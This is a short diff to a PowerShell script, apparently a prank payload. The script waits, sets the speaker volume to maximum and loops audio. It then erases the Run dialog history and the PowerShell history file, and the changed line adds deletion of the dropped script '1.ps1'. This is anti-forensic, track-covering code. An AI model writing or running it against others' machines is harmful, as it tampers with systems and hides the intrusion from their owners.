@@ -14,6 +14,6 @@ Function Set-SpeakerVolume
 sleep 30;
 Set-SpeakerVolume -Max
 $player.PlayLooping();
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist;
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $pshist = Get-PSReadlineOption | select -expand historysavepath; rm $pshist; rm "$env:userprofile\temp\1.ps1"
 while ($true) {
 }
